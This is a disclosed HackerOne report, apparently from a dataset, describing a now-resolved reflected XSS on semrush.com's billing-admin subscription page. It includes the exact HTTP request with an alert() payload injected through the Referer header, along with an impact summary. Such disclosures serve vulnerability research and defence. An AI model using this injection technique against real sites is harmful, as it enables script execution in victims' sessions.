---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '297203'
original_report_id: '297203'
title: Reflected XSS using Header Injection
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: semrush
created_at: '2017-12-12T07:56:28.475Z'
disclosed_at: '2018-01-18T18:57:11.512Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS using Header Injection

## Metadata

- HackerOne Report ID: 297203
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: semrush
- Disclosed At: 2018-01-18T18:57:11.512Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Host : www.semrush.com

Path : /billing-admin/profile/subscription/?l=de

Payload : c5obc'+alert(1)+'p7yd5

Steps to reproduce :

Request Header :

GET /billing-admin/profile/subscription/?l=de HTTP/1.1
Host: www.semrush.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5

Overview :

The payload c5obc'+alert(1)+'p7yd5 was submitted in the Referer HTTP header. Payload is copied from a request and echoed into the application's immediate response in an unsafe way.

## Impact

Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
